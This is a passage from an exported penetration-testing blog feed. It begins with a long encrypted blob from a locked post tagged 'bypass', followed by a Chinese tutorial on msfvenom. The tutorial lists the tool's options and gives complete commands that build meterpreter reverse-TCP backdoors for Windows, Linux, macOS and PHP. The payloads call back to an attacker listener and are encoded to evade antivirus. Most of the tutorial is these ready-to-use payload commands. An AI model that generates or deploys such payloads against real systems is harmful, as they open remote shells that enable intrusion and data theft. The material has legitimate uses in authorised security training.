a047ffd3c0e2dddd5bf7e7d5c404889a05b0b0f06910618768788b9fc27534ddd7387aa921ae91b381baf85ca40298ce0853a683b650db5fc6a75000934651b2e88de8c8f866204d31fcc4cf2e06afcdff75783092a380924b33034772c9828ad915fa38ac62e1214f9279a71e07024fc12866c123bf09987e951361dfda976b4839eeec6c530e922f6f2886d910f00afa7596dfcdf202c60d89353061c26e4c904078f3df398d831cbbf7575c5fa4f2d6092ef7bcc899cc14b42c61a034fb2373ff7e836fd69a21a32227782c64c2fc454b02f3fd084966a96060595f6b937f5f22c2baf2deb9200ff86f08a76433341f994e65957171a53f25c15cc4dab92bf24d14558315d51fa9fe23b8a099ff2ac0c74ebbb0c52ef2deddfd8cf5e707f9e59b40717788b0e30a17d98adc53e4f6b4355f89da16688b23b483f8244e69aec60ab3742f7bb3801859da0e8464bc5fc71df2c7e7c3e855c63b45e96a00dd34e4b407e5b0a88a7603e64601fed7f7983b842be6de9d3218b894e6d62175f98da880b4fadcb092c1758999f0f329d3a29bcf16d7e5cd6e9bc43a59fd75fc34970f3863066b08ce350e433f8b42778fb168306d5d020a3046c1737493b8ee2d319d8daa68caad03d619b968647aabd2565ca69cfb2a930d5746e73ff34c5a6f88c1402b9704ee86bf35c88f8a35230c2c7a6d12486aa773dea134460008899dc9147cd748b352e2607989856e0c71a9dfcea1100ad08be8aede7a076fac56e36313b9c18e1cdd635681ef6c94f89d3be983b78bcf76e306fa9817038fe553a4d18b301431cc6cfaaec236a084f5149d5ee3e237212e0f4b4a0022c34e34d6ba4cb1cb91308e2e6d78f912059e02306071dc86768f132c8265f961b7392987762c3773dda94f1e0813a1aae2dca65b41abcdd0fda1b7de90e0cf4f1eb720f4819dd6c568115fff10d2bad9580019d580f817c20965bf92a377e974e67f44e41ba73442fa9b912043620dbde4793067cb6def3ffeadbd78764803e5cc335240becfbd481642531b521ea99dbf8ca18c834d2101495f317b523ba82ed49611e2bdc2400ad73430e6e4c12f643da5610b03b39fe6be76873c862e253c03bc157c306998a4a03298a6346072d00a8cd8a7a96441e9b26c669cc9b3bf4e71def809fba07562429e8899f78c7d28eb23a21bcff8114319abcf6bc36e8a6a8590086e48ef70beb222a48f7dfd443ed21b814eab7e7de6ecd22f27dd5034997b1056f87a74fd32386b6e7a2d30c336fec364d6bf1b6b01ab97fcd684e4f927f0d0f8838e41487db14aec2c511e2d0f480bcaca7a9d9758eceb70087e017c4b903cd3ca29c0529f6a9b90ed70812454016c01dffe77de33272449c6590d92e6d6a0605ddbc68d56c03520188ec05e8b1797e79d3a30811d2b57010adadf45851705290fddbebb9df0db2bdb2116c59f4a9715cb0ed92191f74785e3e0720140e5525dcce3163d2d96415733a76d18f6edd94346ee97ad33359b4ae015b58dbfcd79181574465dac6ef1a0541bf817b8e5b565c068a7b89926cd933de86ad7c796d202ad1df9d71093249b4abc27d0b9caf87380dbf1aa711362ebc4bd715e8af7f5b5675ba6a882e1273ebd4142a94b64e3a844821c698e9298f66374667523ecef36eb78e2f74b75fd204a1e96d387f61287633102bb8c82dac7ebd9dc86006fbea40026b4c3c126b3e2a6e6bd37c7bd0fbf65953ac03079df2646f543220c3e97c8a6e3f6586c22d6c7c6a757935082f9cb730672afc410512e511be4fd4bd45d94fc33ffb6e93e302029f2ee4f7b09e160f59b1d0fb0aff35c74d62d3c9b8c138d0f9dd5cd02c6a7cc3daa756edc9e02dc4bb8070cddaf2273ef708ef1fb5c8a5e05664733a70835bc9a6aca05d10e139d335efdad6f6f7038bb2b6ba5c8c8515208a07a1f2b5c5281a84936c95eea249f7d345920c45da299fd12b7f116292c12d3b95755f431ea195fd10ebe902760113133d4f332354cf34ae68d24cc16c48a476abfc3047bf4ab1cc818b4a87fc0f08c2f38ce00b252fd06b7596a33e9104718c4d94753a44a8ae365583f0dd4a4e4a9d60f3d80717f6e99ddbcab64e5730f1af88d8e6b18b7dbdca9979b1148ccbcd0125db7f933909f9e61706bd8441a3447b51eaf060d9f168c963065ada6f7c08ed466e43ae66bd00380513897f8f1ebf2f896d0602c2724a5a9d8ba05bd394953ed2bd8efbd7f3546140597fe9edc1481d219c983c01e30f1a5ef52974e4263e478f048ed4726914274b205b406666da3ea5d92bc4e057e6cdc19b7046f72e49279b7c6b9867b79b9e8daa991e916c58b468a26bacfc686f55ead4f47300a08affa60e00d0ecae918fe420430ba82f70c5f7d30b8f60b4b19759d1999b4da2292ec5db48414ecb94b041c5603eae8e7c336af287ca9e8ad8cc3adb371101a89a05a82e3f1331aae8ccd369ddaf793d2ae1dee19b79718030cc3d3e60ea260c3f92c981e1714f9935c0cdc02f764b7686267f4647dd10b8f997317e71c31a0049fc1a8ce9319ea936b7244cbbc350ba83692ae7b2aa68ef58a767afa02366ca9953d2a3dfc3e6b13f767980c1b59288804ef1468699ab04471401760f841e4ed9ee631f635906abf8132360f938669931b176c7ff790ff4b4974d6cac31a3db5bcb16a06d06bfd209f722d2816b0f97a6e8964b41ac937c07d5ed9562ceebae9705b96158e1b695ffca1191a4b5af38dc97b7de6293503f4f596776a1b8781b797514e4cf856926a054e0427aec29127fa171e4080213e1c46735dea6e1808bcc0c4173a3964d9beed3551108647c07d6b5b4519d5e7aad10d8ad70d84ec415893cbfd8f2876b1ab98f322dc3e5970f2b1b6fc585e64f4035fe00f70482987eeba9a47ed7d85256983e0c1032a63b1b505cb2c5e8a8c22e106c8b5d4ac78b87318a26e2cf31ba1db072fa23feb5f2109bf9850097b92013839097a50617ccebe304c44d2fa1b368ed106801065624f3dd3702e8f31dd53789a7ac8729bd8ac164e5ebc5d15b82f18dc030b594efafd5a8f92897d5c4707ef793664661eaa32351dae9f9f8c1449bbe446ad5f772e5919c458874da72c2806b7fdffbf19d558f0630ed0dede18251b91854a017364ac8aa1ffcd48334cd98d8f685529761622023bdd3cbb7150045ad74977d8170be4672e13e9a56ad5b229da6f6b94e5cb652e7677033f05f177308bffe70b592e01e6a60e4518c82baabf0d1cce4b50df89e07b28b44440dc09c4c35a82481a08beff25680d51896749298e4fadb404ad03d50bdb58699893ea833ab75ec54c53bdcd9ae2ca48f2896f7b4449982d8a095c4746e28d792ee79d8e95141cb5e02096ebcd1a5f7e411d02c0d1543fdbf9c5ea8567a7c8d8b3f72e9547f0dd6ca8b4c2e4f85884e8ef88a0fc7ae305fc96ca9e534327c6c7a596078258343c4e54d0862f39977a517c8cf8da189f8d93b75c780797927771fb6391abfd891c36a05ec29b43a25f0639a7cdeb0abf0f37bec31b395950d3ae3c411e8b5dfa40195644de6a148e856b7338c265883bc46156088560f3e7dc2e63718a72a845a0929f1218b8e7f514aa76b5af495fc0e3bf4e2a571b2223b352ec8d446a2986da4a17cc70de0eec1dea895d0f49e957e06980f3701880d9a372485dd025b79b963cf8c179f26f6cddba17f4a92cd96f92c755f22619ce643ece42231846ed03cf08fb7e7556be31f3ffa4bfe52b7d49271bf7af2401db4d4158e7929a7eeb4c7e46a687332ca7c0f71732592f4e96cad2cd19dc5220910e73f61e6d27be9d4eca58c82c29808028e2e269c53c53a26ca3ac3df8cc68cfcab72c52b89ad59e156bd082151efe1905473874a5dd10d747f63c93905a9bfce1f15491ed32deb3dd2531a4e0060231e78367f2dbe93858e324f5bc3be8e99c1770c95e0b62732bd04baff274cf6937f8ecdb8e89ce5f15afc647eeb1639d63ef000a6ccd8c85df39b9522088446b74c860935820aaa053af3b4af4d10339b8252de5932d092e5c9e6209c939bcbed5335659313c4e971ba15b11d8a4d9ff3e61a5ae7036fc087dc71144f34dcf4c2f04cbfa137df32a8a365413a2774a1496ffc1da0ec477a3b811bef8e2f32c7903205d30dac3dd5f2bbf82722c47290753f0aa31c4227b5c7858dc93913a2d4f766a8b18480c5e5b8225edacf37cef46a47d35bec747da5b702f95c4cf9440ae7e1310a46e6a2ecb2e409828117c39c993f3c1e711324e14b335fe092c7c65feb17f5cf6160d58de2cc7ea6cfba604578f8f70b4bd412cdffe871d01d1ffef04ef4613841b73a014de3cf589aa972618ce0d9d2f902615d0ed6efd72534f8696f404b6c647d819b8a4e9a100eca5527b546a488efec16e8fd9774e21b3fbfa87042eacc588bff0bd66f9e06a8f58137a3a648dedc1e6d9a7784134b9b34de92d242e077da3c2041cf07432a1fc5090710c3b52944c838f602a40020e12c1773fa6462dfb51663e406dc32765bc5b365fa33983a214b38f1341063409c175f0f2c9dcc651ed2aebac2668281bbd55cc6d80e7bf0f96476506737b1cc343084d0b932f36bd0ffff89d2944bf395bdac5f9210540f2fde7a60230196aea8a6c060021dee8f2b785a6cc4d234df5436515076a92aa16bb4543b993ce9b9f6b73c046438edfab4964fc35f541b7b92a1f16f8a30f64c18ee0e48e56cb20487cbda6c0302094d9414580e7de2cbf463365c81bbc4d0216c7a93c8874faa3aeedf90914fd40c94ae78fedbabf1635e315c7dab7732327b092a024f6c40f8220fd448dd979930a7445e069a67304f98c2ffba02bd45fc6fbd0eb2314f90ea29592595a21dbeacfc7b6d2ebaa73b7f5cac7247213c8b6dbbcead563b6a542b3ac9d48edc8ba79aa5489e33c98b32e4c639998ef2373696a8d1f329dc4be93c35ab1a0134c46f0dd845b79c6d786c872c3919ae2af9cacbd2a043ed9075ec68520abd01b57760ee554f734f10526fb4dbc626e00c2c89dccf6a8164418c292c1524e6ea22107d698cbe152b88ba45add1311708bb392fc4caaa1b46b2108c0bd49a968bddd72c2e288c666ec6a3159287b5aa007216d0e9d7bcd71499ab98ac3b0e9945910c54a24d49719d04c8e9f81630fec60b84916a191fbd3602949f9c95d55691e95577c9e8153e1f086cad0bb6cb476859d34f7a835a1a3bec79b9672b8894fa9582b0de5b4e61abb566b448df2fd87e0bfd7538733690381eaf16c1abb795da0b7f1c8da0d3c6e38d3168584c7c62cad29b50415749c5f8b9ceecd8cce3677ede60bc1d7f7bc038f1bf7fd0a35b2309f5bbb7eb4ca9243ea78b2c1a4f3ae1a75bf3b45ddf5677950a462f1d444d8f87238d253d317bd9feedf41a720357845b4d51d9f4155a553033c12e1bb5d7ecd6397b952639b09096e641c5691f092388b524974ef147649c339316ad28cbf936f707a5a38050ae105fc390c64c684785916a1214f3c424258988e8054e3e66940df34d5f96fc16730f68f520bd8fe542df826f67ca5573283d5fa7d879a497ae8060a823f86d549c9064d9fa8555847a50496649b4dbbd829a107e201f8528d2440a5d17a38d424a6003a12eb013eeba06b168d2bf3d7a7294a8c03223353eef461884a723b25469e46fb6b8cebfc87b354662bb1ac2e8e59867fd8f764ecd7f183ca3defb939c4a30c669685c1ea171010f8239f9af91a6614409a8cb530f60c8f613716c616002a602f0c73ebb06a20b689a24570f43afca20ab70f6abdfac1d5e91a07e109ee4ea72b0c8966e5d8e5f9c82c495ffa9d51c0f938c6f4041b5909f276636565d8989af9e01a3e10ab3badf4cf5723e1203b116f793ac77c993b0d0b5e3ac92c375bbb75143e6de823736e558f5e1c414f216c439984702cc27c344d04aaaacc5569a9c036b836ce6a09cf18c045b76bca049647fb1cea1e26c007047a14be8c7d0e9deea4a7d412a3ff864cb16b6cf30e0308f4783b9017cb42d8655700ec9bf101fb48497e4198a0e55a2af5fd1701a81fded09a433f81c3736c817cec52e836075df03b8740f16036a2e335c71148f8c293989fce9058fed969dad462c17d68212bab554681b47ea93afbbe146901a6c3e15d332a5ceae1e50dcc0b2424f848973f3899e1cb5fdbf06b70f87e5ea57c86afe291d54377f0ab2934e8e980d86af2bce18498adb97de915cd8d4ac28895681285f67205d20319178d32b39f946b8088a089019120fb9dfd5ba05ba76a02acfbbb04311bc6e7c555661ce7685c265b399ad175a80f2eef9aea5ae3bd77d29e3441eb7ba805277e236beee03629f51ac903a641e664a403ec6d76b22199008d59634c6e578c3058647a1ed7af9df462e5e41fa10cf7f0b2dfd4f2be9b531381a4c4dec987a786d6cc4f7df0a59aef35f355c41af0407c8634d508ce7134a4cffe994f3811122fe5a5d41dbdedbcee47ab5de80b52cb51f6257befe3b44fe7666d61c26f0a7f654d31832eca65271ab3d0b5d6c4e74cf5d2bc54087757dcd5a9586bd4bc978946557294731d0e70cfbc950b82633b2a01714eb4d24e554c9f1e5586be5108c4f3c1220598a79ace8ca0b82b6355e49414ab9975fe64ab69be9ef35fb51e5c0ae670e44b7220161c82d6858829c42223414464c693ca714b71150bd4ac93750e2ccfd285e819a430867e88602014bec68689e6c3a38c04d0105943ae3c099353c71f10e59e7329d9f079f1aab5371db25b803d356332fe9cc4f1001ea163797e7c192089e7be28f194ae119ae2276bca07c93350fe83b1c38886c1e07747d6fc3bde480b47d11acc189bc4797501355f69401817ab370970b95c91d22f197f217340d31ef962b34ff643ea4610acb8b116c53fe9a6156c8674c3b2bc36acf8fa728509b6065b4fbbae4e5218324071345363401a439f0851674396c6fa2dcb107d8d697bc2d7ad1acf257c03c7b244fc245558a4be7021086803f33e8d47a6914f734c0c402990df01da4ba331bcc306675fe5464eab02e71516611731d1e25004edc551d25ce7b59a3ea60c0cc42832a80c7769aac8606e58dd245e88f906c93daeca110915a2553bcd6acc4c6347f68240afd3b23500e11ada6d678086b1cc12ad65e1a41795f74672cb74c94b5d02f048881436722c3dccb80f10f44f24bf1219b5812c6a70832aa3f51664127f647bd9117126a227bb849c6977fb64fb0219754d3527ce92c43c0573d220e9968722b37c55ee01217853142dec65260bdac703fb6a8c02ab9f173d1a1fb15238724b8c285a93ca5fb4d7ef89ff3e220fe22f27f61b22c455a5cbf872494d0357558023e85bc0479c273623dfb9734c0c68e33c9253883b09bb520e6f951f513bad89d05ced9b1718a57b04f24efbef81188cb9d475c833917986394bf42b99f2cde53566eed0bba30445dd6a14c85040d25a14c1582b2f84635d3d2564a78473b04b90ffc2ad0945bc7b3aa8b9511e1b2405257cab3b25ff79c70653d7bdf59cd79933ac511a756882e84f15a8b991cd0f672f754f8132da4492aa1032c6bdd72b2666c7d2b39b806ea3a5a408b774ca386f39ba8803901048d930a6d61cf84f0e16b99f329ef017635ab63b6c2b5a80e27fa3a6daa3eef5ca74dd683f0ed519503341e55849e2e8a20dffdaaba68b6e9352de045343ffb84c64cef9e13e50da044f371614e4cc0d5d4df3bbf47435c1f6aa1fc4a8874c2106b3f80a892103727a340b473b5039bd31fc58778ac0e00478e537d498a7478e55451a316775d1e7c18db1f3c1bae465c2cda38af020a60ac1b71aa9f4feee7ad0804b2475852b5ce2593b4e1f03165a7006bc1fafd776329bfbedd8caf6e4af39932292dc85a3ce31f46f10b08562d736e22e46bd1bb76af245e30042f5410cab61d792f3ca6ec5042fb0b075d5122480e6f064e320f54664acd671332794f423144528944b74d5b487719ea362ee82e983de59f3350a793cf97a596cb53cc49d996a87ae75a141c0f08de64624c92ca7bfe861621ee1eb4b0cea923bbaaa556383a506d5df5cb5b8b7462a5361e90b9085d7fe622ec19cb068de8952bdb2328e001bf164401ce4940ece5c587d4649d5bac4998a6b47e2cbb81d7df4493644fa436682c5109f8b17a3f99cc7849c53ce2b455819d497cef1e879b1fb328fe01099641f7dde605a1deed3076da2b34ff2ae586c60f9567fd5307b80a08088b86cf70a04f8ab4166f3f8ab99d9e0d3376504550b19fa83bb5e314abb2c353bfee51daf007672ac40c4d3190d9abdb94110ebb69bccb14e4175f2e735b52174b605f9f14e739dd117295385f1325e3d0efe83503ec35452b92a6b7e9cfee731d3120e90c5567a689786f5ebc532395d34f1f91122340eba640eedbe4cf57d44c2727010a970aab9b006fe3627acae5e1f0ee3412ab85f171d0dbd766586fc313cb1a799c3eb72f49569edc96c08fd69b5856e6e9cbbeafd32295235cc9ef206fec3acfbbb5d531009a6f627db0c5f133bdf221a59373e17f3b8dfa8e506e80ecad9f50e2365d78fdda86d20090004950345ed3075711daa749f249b0e5cb5d0f121cc460581c4caf350d7a68d283f6c7840c3603f620ac92cd69f4406347ad594dd5576dc02ee93797ea63bb273a3193ab58a579206c4601e980e3508a9269ddd408c44e1fb7483d7917e2f373578d34bf702b6f898f39653a4b293286d622971feb93ac9f202644fe8196c74e3be3c72a5fe69b5dce8fc8e5b24312e2cf003883394c6663c6180c33926688250290d507d7c93f9b0308c25ec7bb4c118fdc938b6da5d3ffcd10c014f6d530fb00e388702844f0a458ea7859f9269aaeb3d22d16f2d1a5fef10cea1dd270f1fdf5e9cf4bb3f8dd8ca0b0967111becf07adc5ed7f442e006d7a80c3ed0b1ec456c4cdb671ecf4235baffff47e79e458a725e9ea7a0f96e2ca12add0c7d3f9f54445564929c1c511d7efa41a0a79a49362ad87a68534c8e6aea7d10ba0680cec297be4aab11d0c37145a9c324a030fe9b1936941fcbd775438af3ffff1873c01453d43729658a81e70856025f754a31a15e32c736f48d2b9676a26f7f4efb43ef50336332e3080017ebea8101c837c4f089a48c584166dccbbaec04b6e96c6a87a1dbc846f0b3ded3f3ceb880bf519f711099a170af7c3b49ec9621fc28e5600fe643d398c2a612f4990c1c445cfd6413e3050c66073d603decc7a18bfa3aceaa4834391c817d1e942091445e62eb53b612797c20f35b57e5876947749e59205378307e61c9d828fccec42578bb8e32b917ae3416ed7cb036bdced1fae8089bd5af862accd8349e090a944542545c3f06c58ad01813e8687712bace575b7a3ffcc77ae71c1e9bce2a439bd395f29c5d53f796b4e99d3642bbfd87d67fc54ba3af55c73cb24136a95dfe8bdd7bb00ba837e6ceab088cd8dd0d888b9d311a595e91351bb291a4648ae7e19fac4de6446f52273702c7138e62941e1c4bca3ce64f8be5afb7bfc32cd72141e04d253287670ef107ab22a2794808e6411a39a3f91146817604be59cf55ce0c6951629f09e5a831811e05464021982f0adaa3d589c48cec115a19d99dbd345e00e204bb8339c4eddac79c30cd9aaf14a3382d71fd9aa128be824fb69bfb2b6683cd9271fc1ac98a0d87eb4dcf22d61eab4fa4d06749339eedc59ab7842f52406fb75b1da23080b79ef8b775389369328dab680a6b811fbcb8d9fe1c2f8502c78fe29f31c6432f337e316618ae9e99222913e3d3f60d51764ead874cda798053409a53f9f7276abe1985f65bed3703fc8f89833bd6182337f7806fc5ce6c7e8edd73c27f33d47bf85fbc240f4dfb66514d2d014e62555262c690da52ef2a3ba3529dd2bd6b0b5c649e93d17cc7ae9191dc3c4fe23a53d0553dbcd3a64144443472bfdfb90d52fb1c544b3c19867f1aff5f297a481226ddce9acc9ad4b13498d9251603dbce199627c81afa3cee3062521d5b35881da0b3c7db545538c26ade8fa6f814f8eca65a42eaf41a8d856c13601d353e27fed0422a782dfb2023c62d201b72ada93dd694da448e0f8bf0e36e752fb33b7ace830a9e6091f15f222cf73230f6628491839cd08fc553136514cb0871b2aea25946f3e856ff1d73bf0a1cb70316dec5598d6a2ee57c842f9b2a0a31f48cd7c1847e79b93f2217a8bd07386e6839cd3478c8fffba4a2181343f9fd364ff7e260967150edb8be424b7fff388e518f034d747de90bea7be84a2069ac186b4390d435b07fd9b4c990a9178d696b8bc9680076f6235cda0a870f0f12e38cb189b92b03368f2be828bcd4e103d7cf729ccde93edf9c4f332067cff87fb6a695d2e544b8bc15d841d7e83fd4a000147d9e9f7b92b16e06ba7a29f3a269448ba4ce4b475c020a50137b5606a359cedd37d0ccf11b8109693e4d691ba68d58da7b066fb0c64db34521c0ae8737ec5c2a3e45395e732626b75c3b58b31fe7937ae043e65719ef5a9770a3e6b824339050e2efc622a3198cfe27c8e986c92d2b816a4a2f076cc5b510ed8f0657ba3fb4b290687dc83d4f8c6049f5b04358f82fb5fb32fa5dfbf939a0aecf1a30163f641afeb532e60969e619aa73788c0008cf425a45d2bc55e4f462c2338bb8c69074a8d5dfe9ae2217ff3b3c3237cba4a9d8c412a3892d1502bc8bdba00a70d07d2b8bc54afc7ae9f1281dd7adf4566dfb58377f182b007c5726e6f1cee6cd62c53e8ad3bc4cb990c7f5a678dfc1fa2332f5c0985c286a69c45736f42ac406b7c8cff8eb656e0762d4475759559138d2f5bc9ed7a233d98661d89cc907dc158323efb26ca2d5167b1f0579932927d9fe7ecc962997a3340d2548a323de2cc01e20f1adcaf9e74ac3492b68eba963f0029ad52cdd5ff7a4f7441980ac2fbcd6a6050911b7a885a9c413816c6b323862600be1c0b5d3cb47c91749e10abc184f732748b3a34bb853554ed92bd63b9a62467a96c0db0cd1b5048f53748fb5582a4d01e0c3f58fa2a9cdd47967aa79e8a5edb35d42201a8c94c88f49c971d058e83928e44de7643e5f73ac345c4c8f93940798512c294945815c2a583a112510e06b5e129d863ce409ec2bf29a14454f2b91a83067aaf733aa6814936c52f00f03b425b745257278af483ddfdcf7bc881e59d2717ee079bc802155478dc8443fde5ef3adc8a81fc8223eb55486af4ff2619a831da186e90e14a1c0d2baa36c498081bd1ab81e4060f75312c85923aa25a1c330f2c31662f3eb9866e7f475d3c8ae8c6d8cac583b7d8861e0023283d15e0897d9061146339d723c33b5ad1633b02195c8e30190a26e37fa6cd57c094d1a3b6063b2a39d912718e89a9a64c1ab772815af03c4999589bc0120e344c9736acd6d4e9242cab66b089fba7164607ec97150eb45890085a6e82100392a04a8348ff3917d745dcb090f1b94c8248a26db11551526f8bcb2a88f1ca439f568bb085c38d343803e5dbd4b775e317fdcf35c3460ece47edfc3d7752a74da1ec554a8c738d2149ec1866ed78e0953327d628302a433a9db501761daf3c838d1649bb8c720fc23a834c649695df5dc8403d962d193363954f3bbb274e9fc6df474b33f7f5076c383bcd5573f2be2ac92453dd5157eb5e411e307106f3a782e4a5ae038efcd3a98cf09079430ceeb42730fcaab00c1c3ba6e5636498e21bcbe612b8c63fdad3036532e7a27e87e25317fe99921a0342d10898af84281f9f7d7a221c7ed407ac5cf8bf5d1a289e3369aad472fb31da524b8b89f89b3edafb8162576a6b3e7cf649cf18fb8306e9c848d32be3f9af99bb94da44fbf46137af121cf9778b2e522e0134af4f6ab455ac782641ed5a2e185131417d06e56ac241a9cf7c2096a33bdea6aa1e28fee7aef01846ab545089308ed87338b64727bc3420d637924a643b1c7af81ac281f45a794e8e3704a0c386726697e0d463479ac57d326f22c1b05a43e0b3aca438bdc0f4154f744b51bf648a3f1c499968cf1e3459f5f8eda7149dc93c995aeac5f313f731accb624f9c1cdce56a86f9434b23d9b511516d13c6636b7618b20153f8fea6e9d8336e714d76ca6e4d1875334d8fd7422123016a417a372c3293103ee67fe1a383b1a663b7672f56e8e57c0e9bb199502e87930775bd7d15a3b11b438b3e60cb4e828db1f2a799d547527ebf11c80a82b5ceb0e66ee77a4e026811f1953705e4e31788694d1d5ded73aac95858b8266dc9e65c9919e0f0ebc61e6602e440c56111650c2fbc0c1dfa3cb461dfa050b8eb5453c10fd3e7b943a90d682b67f1f12fa45a31ff8018fb40e88661664308bbe496803aa50abc31edb3ba40607e1f7fde0a91263b0584988d44b59e2cde04122b243619df4d1d0f9cf8b5740b1a805391be6a96c04c465f1315cf0cb88ccf5568686592a53b869f844b2cf6249e300885e90d6578ff759369973868b706a62b07a789d9dc2a490d78d2694a9bd6068f4d31ae99fbc1285b492280273669d9b643fba1e78eb119e15af3036550413c86ec034607ac79169217d9850427cd5469ccdc47f31ac9ac49c47e0f11a459814d19384fc45983b047b094b4d26ff28d9e6c42d869bd0865c75a0cc2154119279dba15f2e3c039859b6997cf4885e32268776e13fa4f93f88ea17bee9ef259f887f47030b4d9338fe095728bab6c2e2a3ed11ca4c7eeb98244e66ce7e9ba2b79e3e94e29c9595997eca394b9af26a9e98dcff10ea8fabfcc17d7c7da949f311d736e920285e2853cd2e6ce48c5e6f1b1dd076f2a59521ca4ee88f8d60588d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>msfvenom用法</title>
    <url>/2020/03/29/msfvenom/</url>
    <content><![CDATA[<h2 id="msfvenom用法"><a href="#msfvenom用法" class="headerlink" title="msfvenom用法"></a>msfvenom用法</h2><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><a id="more"></a>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">   -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等</span><br><span class="line">   -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span><br><span class="line">       --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项</span><br><span class="line">   -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)</span><br><span class="line">   -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)</span><br><span class="line">       --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串</span><br><span class="line">       --smallest                      # 使用所有可用的编码器生成最小的payload</span><br><span class="line">       --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)</span><br><span class="line">       --encrypt-key     &lt;value&gt;       # 用于加密的密钥</span><br><span class="line">       --encrypt-iv      &lt;value&gt;       # 加密的初始化向量</span><br><span class="line">   -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)</span><br><span class="line">       --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)</span><br><span class="line">   -o, --out             &lt;path&gt;        # 保存payload文件</span><br><span class="line">   -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'</span><br><span class="line">   -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量</span><br><span class="line">   -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度</span><br><span class="line">       --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度</span><br><span class="line">   -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数</span><br><span class="line">   -c, --add-code        &lt;path&gt;        # 指定包含一个额外的win32 shellcode文件</span><br><span class="line">   -x, --template        &lt;path&gt;        # 指定一个特定的可执行文件作为模板</span><br><span class="line">   -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行</span><br><span class="line">   -v, --var-name        &lt;value&gt;       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">   -t, --timeout         &lt;second&gt;      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）</span><br><span class="line">   -h, --help                          # 帮助</span><br></pre></td></tr></table></figure>



<h4 id="使用–list-encorders查看所有编码器"><a href="#使用–list-encorders查看所有编码器" class="headerlink" title="使用–list encorders查看所有编码器"></a>使用–list encorders查看所有编码器</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200325160228.png" alt=""></p>
<p>同理可以使用</p>
<p><code>--list payloads</code> 查看所有payloads</p>
<p><code>--list archs</code> 查看所有架构</p>
<p><code>--list platform</code> 查看所有平台。</p>
<p><code>--list formats</code> 查看所有输出格式</p>
<p><code>--list</code> 也可以使用<code>-l</code>代替</p>
<h3 id="生成payload的不同方式"><a href="#生成payload的不同方式" class="headerlink" title="生成payload的不同方式"></a>生成payload的不同方式</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e x86/shikata_ga_nai &gt; shell.ex</span><br></pre></td></tr></table></figure>

<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f exe -e powershell_base64 &gt; shell.exe</span><br></pre></td></tr></table></figure>



<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e x86/shikata_ga_nai &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.222.135 LPORT=4567 -f elf -e powershell_base64 &gt; shell.elf</span><br></pre></td></tr></table></figure>

<h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><h5 id="32位-2"><a href="#32位-2" class="headerlink" title="32位"></a>32位</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.222.135 LPORT=4567  -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>



<h4 id="WEB常用"><a href="#WEB常用" class="headerlink" title="WEB常用"></a>WEB常用</h4><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.223 LPORT=9999 -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

